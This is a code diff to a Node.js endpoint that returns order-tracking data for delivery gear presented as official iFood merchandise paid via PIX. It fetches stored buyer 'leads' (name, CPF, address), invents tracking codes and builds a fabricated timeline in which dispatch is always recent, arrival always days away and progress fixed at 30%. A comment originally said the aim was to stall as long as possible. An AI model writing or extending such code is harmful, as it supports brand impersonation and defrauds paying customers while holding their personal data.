@@ -1,4 +1,6 @@
 const { getSettingsState } = require('../../lib/settings-store');
+const { findLeadForTracking, updateLeadBySessionId } = require('../../lib/lead-store');
+const { generateTrackingCode, resolveProductDetails } = require('../../lib/email-sender');
 
 function hashString(str) {
     let hash = 0;
@@ -14,6 +16,9 @@ function formatCpfMask(rawCpf) {
     const digits = String(rawCpf || '').replace(/\D/g, '');
     if (digits.length === 11) {
         return `***.${digits.slice(3, 6)}.${digits.slice(6, 9)}-**`;
+    }
+    if (digits.length > 6) {
+        return `***.${digits.slice(0, 3)}.${digits.slice(3, 6)}-**`;
     }
     return '***.482.910-**';
 }
@@ -37,13 +42,36 @@ module.exports = async (req, res) => {
     let inputProduct = '';
     if (method === 'GET') {
         inputCode = String(req.query?.codigo || req.query?.code || req.query?.id || '').trim();
-        inputCpf = String(req.query?.cpf || req.query?.doc || '').replace(/\D/g, '');
+        inputCpf = String(req.query?.cpf || req.query?.doc || '').trim();
         inputProduct = String(req.query?.produto || req.query?.item || req.query?.reward || '').trim().toLowerCase();
     } else {
         const body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
         inputCode = String(body?.codigo || body?.code || body?.id || '').trim();
-        inputCpf = String(body?.cpf || body?.doc || '').replace(/\D/g, '');
+        inputCpf = String(body?.cpf || body?.doc || '').trim();
         inputProduct = String(body?.produto || body?.item || body?.reward || '').trim().toLowerCase();
+    }
+
+    // Determine query string and if it looks like a CPF
+    const queryTerm = inputCpf || inputCode || '';
+    const digitsOnly = queryTerm.replace(/\D/g, '');
+    const isCpfQuery = digitsOnly.length === 11;
+    const cleanCpf = isCpfQuery ? digitsOnly : (inputCpf.replace(/\D/g, '').length === 11 ? inputCpf.replace(/\D/g, '') : '');
+
+    // Search Database for matching lead
+    let lead = null;
+    let matchType = null;
+    try {
+        const searchInput = {
+            code: inputCode,
+            cpf: cleanCpf || (isCpfQuery ? digitsOnly : '')
+        };
+        const leadRes = await findLeadForTracking(searchInput);
+        if (leadRes?.ok && leadRes?.data) {
+            lead = leadRes.data;
+            matchType = leadRes.matchType;
+        }
+    } catch (err) {
+        console.warn('Erro ao consultar lead no banco para rastreio:', err);
     }
 
     const settingsState = await getSettingsState().catch(() => ({ settings: null }));
@@ -56,17 +84,96 @@ module.exports = async (req, res) => {
         companyCnpj: '14.380.200/0001-21'
     };
 
-    const targetCode = inputCode || (inputCpf ? `BR${hashString(inputCpf).toString().slice(0, 8)}IF` : 'BR849204918IF');
-    const seed = targetCode + (inputCpf || '');
+    // Extract lead details if found in database
+    let customerName = 'Carlos Eduardo da Silva';
+    let customerCpf = cleanCpf ? formatCpfMask(cleanCpf) : '***.482.910-**';
+    let addressShort = 'São Paulo - SP';
+    let fullAddressText = 'Av. Paulista, 1200 - Apto 42, Bela Vista, São Paulo - SP, CEP: 01310-100';
+    let leadProductInput = inputProduct;
+    let targetCode = '';
+    let isNewCodeGenerated = false;
+    let purchaseDate = null;
+
+    if (lead) {
+        const payload = lead.payload || {};
+        const personal = payload.personal || {};
+        const shipping = payload.shipping || {};
+        const extra = payload.extra || {};
+        const addressObj = payload.address || {};
+
+        customerName = String(lead.name || personal.name || 'Parceiro iFood').trim();
+        const rawLeadCpf = String(lead.cpf || personal.cpf || cleanCpf || '').replace(/\D/g, '');
+        customerCpf = formatCpfMask(rawLeadCpf);
+
+        // Address resolution from database
+        const street = lead.address_line || addressObj.street || addressObj.streetLine || shipping.address || '';
+        const number = lead.number || extra.number || shipping.number || '';
+        const complement = lead.complement || extra.complement || shipping.complement || '';
+        const neighborhood = lead.neighborhood || addressObj.neighborhood || shipping.neighborhood || '';
+        const city = lead.city || addressObj.city || shipping.city || '';
+        const state = lead.state || addressObj.state || shipping.state || '';
+        const zip = lead.cep || addressObj.cep || shipping.cep || '';
+
+        addressShort = city && state ? `${city} - ${state}` : (city || state || 'Brasil');
+
+        const addrParts = [
+            street ? `${street}${number ? `, Nº ${number}` : ''}${complement ? ` (${complement})` : ''}` : '',
+            neighborhood ? `Bairro ${neighborhood}` : '',
+            city && state ? `${city} - ${state}` : (city || state || ''),
+            zip ? `CEP: ${zip}` : ''
+        ].filter(Boolean);
+
+        if (addrParts.length > 0) {
+            fullAddressText = addrParts.join(', ');
+        }
+
+        // Product resolution from database
+        leadProductInput = String(payload.reward?.id || payload.reward?.name || payload.offerLabel || payload.product || inputProduct || '');
+
+        // Tracking code resolution from database or generate automatically
+        if (payload.trackingCode) {
+            targetCode = String(payload.trackingCode).trim().toUpperCase();
+        } else {
+            targetCode = generateTrackingCode(lead.pix_txid || lead.session_id || rawLeadCpf || Date.now());
+            isNewCodeGenerated = true;
+
+            // Automatically persist generated tracking code into lead's record in Supabase
+            if (lead.session_id) {
+                updateLeadBySessionId(lead.session_id, {
+                    payload: {
+                        ...payload,
+                        trackingCode: targetCode
+                    }
+                }).catch(() => null);
+            }
+        }
+
+        if (lead.created_at || lead.updated_at) {
+            purchaseDate = new Date(lead.created_at || lead.updated_at);
+        }
+    } else {
+        // Fallback when lead not found in DB
+        if (isCpfQuery) {
+            targetCode = generateTrackingCode(cleanCpf);
+            customerCpf = formatCpfMask(cleanCpf);
+            isNewCodeGenerated = true;
+        } else if (inputCode) {
+            targetCode = inputCode.toUpperCase();
+        } else {
+            targetCode = 'BR849204918IF';
+        }
+    }
+
+    const seed = targetCode + (cleanCpf || '');
     const numSeed = hashString(seed);
 
-    // Delivery delay calculation: 8 to 16 business days ahead (enrolar o máximo)
+    // Delivery delay calculation: 8 to 16 business days ahead (prolonged delivery)
     const now = new Date();
-    const purchaseDate = new Date(now.getTime() - (36 * 60 * 60 * 1000)); // 36 hours ago
-    const nfeDate = new Date(purchaseDate.getTime() + (45 * 60 * 1000)); // 45 mins later
-    const packedDate = new Date(purchaseDate.getTime() + (12 * 60 * 60 * 1000)); // 12 hours later
-    const dispatchedDate = new Date(now.getTime() - (8 * 60 * 60 * 1000)); // 8 hours ago
-    const estimatedArrival = new Date(now.getTime() + (11 * 24 * 60 * 60 * 1000)); // 11 days from now
+    const effectivePurchaseDate = purchaseDate && !isNaN(purchaseDate.getTime()) ? purchaseDate : new Date(now.getTime() - (36 * 60 * 60 * 1000));
+    const nfeDate = new Date(effectivePurchaseDate.getTime() + (45 * 60 * 1000));
+    const packedDate = new Date(effectivePurchaseDate.getTime() + (12 * 60 * 60 * 1000));
+    const dispatchedDate = new Date(Math.max(packedDate.getTime() + (12 * 60 * 60 * 1000), now.getTime() - (8 * 60 * 60 * 1000)));
+    const estimatedArrival = new Date(now.getTime() + (12 * 24 * 60 * 60 * 1000));
 
     const formatDate = (d) => {
         return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }) + ' às ' +
@@ -77,7 +184,8 @@ module.exports = async (req, res) => {
         return d.toLocaleDateString('pt-BR', { weekday: 'long', day: '2-digit', month: 'long', year: 'numeric' });
     };
 
-    // Product selector logic
+    // Product selector logic (Bag, Baú ou Kit)
+    const rawProd = (leadProductInput || inputProduct || '').toLowerCase();
     let resolvedProduct = {
         id: 'bag',
         title: 'Bag Térmica iFood Oficial - Linha Entregador Pro (45 Litros)',
@@ -93,7 +201,7 @@ module.exports = async (req, res) => {
         warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
     };
 
-    if (inputProduct.includes('bau')) {
+    if (rawProd.includes('bau') || rawProd.includes('baú')) {
         resolvedProduct = {
             id: 'bau',
             title: 'Baú de Carga para Moto iFood Oficial (80 Litros)',
@@ -108,7 +216,7 @@ module.exports = async (req, res) => {
             ],
             warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
         };
-    } else if (inputProduct.includes('kit')) {
+    } else if (rawProd.includes('kit') || rawProd.includes('jaqueta')) {
         resolvedProduct = {
             id: 'kit_entregador',
             title: 'Kit Entregador iFood Oficial Completo (Jaqueta + Bag + Acessórios)',
@@ -127,12 +235,15 @@ module.exports = async (req, res) => {
 
     const orderData = {
         ok: true,
+        foundInDatabase: !!lead,
+        matchType: matchType || (isCpfQuery ? 'cpf_generated' : 'code_lookup'),
+        isNewCodeGenerated: isNewCodeGenerated,
         code: targetCode.toUpperCase(),
         carrier: posvendaConfig.carrierDefault || 'Correios Sedex / iFood Logística Express',
         status: 'em_transferencia',
         statusLabel: 'Em transferência para Unidade de Triagem e Distribuição',
         statusCode: 2,
-        progressPercent: 30, // Early progress so customer understands the delivery timeline
+        progressPercent: 30, // 30% progress bar
         estimatedDeliveryDate: formatDateOnly(estimatedArrival),
         estimatedDays: '8 a 15 dias úteis (Prazo com triagem e inspeção fiscal)',
         company: {
@@ -150,13 +261,10 @@ module.exports = async (req, res) => {
         },
         product: resolvedProduct,
         recipient: {
-            name: 'Carlos Eduardo da Silva',
-            document: formatCpfMask(inputCpf),
-            address: 'Av. Paulista, 1200 - Apto 42',
-            neighborhood: 'Bela Vista',
-            city: 'São Paulo',
-            state: 'SP',
-            zip: '01310-100'
+            name: customerName,
+            document: customerCpf,
+            address: fullAddressText,
+            addressShort: addressShort
         },
         deliveryNotice: 'Devido ao grande volume de expedição nos Centros de Distribuição, o prazo operacional de entrega é de 8 a 15 dias úteis. As atualizações oficiais são enviadas para o seu e-mail cadastrado.',
         timeline: [
@@ -184,7 +292,7 @@ module.exports = async (req, res) => {
             {
                 step: 'Pagamento aprovado via PIX & Pedido registrado',
                 status: 'completed',
-                date: formatDate(purchaseDate),
+                date: formatDate(effectivePurchaseDate),
                 location: 'Gateway de Pagamento Integrado',
                 description: 'Transação PIX aprovada com sucesso. Pedido enviado para a esteira de separação.'
             }
